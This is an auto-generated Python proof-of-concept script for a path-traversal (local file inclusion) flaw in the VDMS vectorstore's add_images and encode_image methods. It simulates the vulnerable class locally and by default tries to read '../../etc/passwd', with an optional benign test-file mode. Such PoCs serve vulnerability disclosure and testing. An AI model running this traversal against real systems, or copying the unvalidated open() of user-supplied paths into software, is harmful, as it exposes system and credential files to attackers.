#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-012
# Sink: encode_image
# Auto-generated — run with: python3 lfi_supply_like_encode_image_6.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Local File Inclusion (LFI) in langchain-community-only.

Vulnerability: The `add_images` method in VDMS vectorstore accepts a list of file paths
(uris) and passes them directly to `encode_image`, which opens the file without any
path validation or sanitization. An attacker can supply a path like '../../etc/passwd'
to read arbitrary files from the server.

This PoC demonstrates the vulnerability by reading /etc/passwd (or a benign test file).
"""

import sys
import os
import base64
import tempfile
import argparse

# Simulate the vulnerable library code (for standalone testing)
# In a real attack, this would be the actual langchain-community library

class VDMS:
    """Simulated VDMS class with vulnerable encode_image and add_images methods."""
    
    def __init__(self):
        self.embeddings = None
    
    def encode_image(self, image_path: str) -> str:
        """
        VULNERABLE: Opens and reads any file path without validation.
        Returns base64-encoded content.
        """
        with open(image_path, "rb") as f:
            blob = f.read()
            return base64.b64encode(blob).decode("utf-8")
    
    def add_images(self, uris, metadatas=None, ids=None, batch_size=10, add_path=False, **kwargs):
        """
        Entry point that passes user-controlled URIs directly to encode_image.
        """
        # Map from uris to blobs to base64 (VULNERABLE CALL)
        b64_texts = [self.encode_image(image_path=uri) for uri in uris]
        
        # For PoC purposes, just return the base64 content
        return b64_texts


def create_benign_test_file():
    """Create a harmless test file to demonstrate the vulnerability safely."""
    test_content = b"This is a benign test file for PoC demonstration.\n"
    test_path = os.path.join(tempfile.gettempdir(), "poc_test_file.txt")
    with open(test_path, "wb") as f:
        f.write(test_content)
    return test_path


def exploit_lfi(target_path: str, use_benign: bool = True) -> None:
    """
    Exploit the LFI vulnerability by reading a file through the vulnerable API.
    
    Args:
        target_path: Path to read (e.g., '../../etc/passwd' or a benign file)
        use_benign: If True, use a benign test file instead of system files
    """
    print(f"[*] Attempting to read file: {target_path}")
    
    # Create the vulnerable VDMS instance
    vdms = VDMS()
    
    try:
        # Call the vulnerable add_images method with attacker-controlled path
        # The path flows directly to open() without validation
        result = vdms.add_images(uris=[target_path])
        
        if result:
            # Decode and display the content
            decoded_content = base64.b64decode(result[0])
            print("[+] Successfully read file!")
            print("[*] Content (first 500 bytes):")
            print("-" * 50)
            print(decoded_content[:500].decode("utf-8", errors="replace"))
            print("-" * 50)
            
            # Verify we got actual file content (not just empty)
            if len(decoded_content) > 0:
                print("[+] File read confirmed - vulnerability is exploitable!")
                return True
        else:
            print("[-] No content returned")
            return False
            
    except FileNotFoundError:
        print(f"[-] File not found: {target_path}")
        print("[*] Try adjusting the path traversal depth (e.g., '../../etc/passwd')")
        return False
    except PermissionError:
        print(f"[-] Permission denied reading: {target_path}")
        return False
    except Exception as e:
        print(f"[-] Error during exploitation: {e}")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI in langchain-community-only VDMS vectorstore"
    )
    parser.add_argument(
        "--target",
        default="../../etc/passwd",
        help="Target file path to read (default: ../../etc/passwd)"
    )
    parser.add_argument(
        "--benign",
        action="store_true",
        help="Use a benign test file instead of system files (safe mode)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("LFI Exploit PoC for langchain-community-only")
    print("=" * 60)
    
    if args.benign:
        # Create a benign test file to demonstrate the vulnerability safely
        test_path = create_benign_test_file()
        print(f"[*] Using benign test file: {test_path}")
        success = exploit_lfi(test_path, use_benign=True)
        # Clean up test file
        try:
            os.remove(test_path)
        except:
            pass
    else:
        # Attempt to read the target file (default: /etc/passwd)
        success = exploit_lfi(args.target, use_benign=False)
    
    if success:
        print("\n[✓] Vulnerability confirmed: Path traversal leads to arbitrary file read")
        sys.exit(0)
    else:
        print("\n[✗] Exploitation failed - check target path and permissions")
        sys.exit(1)


if __name__ == "__main__":
    main()
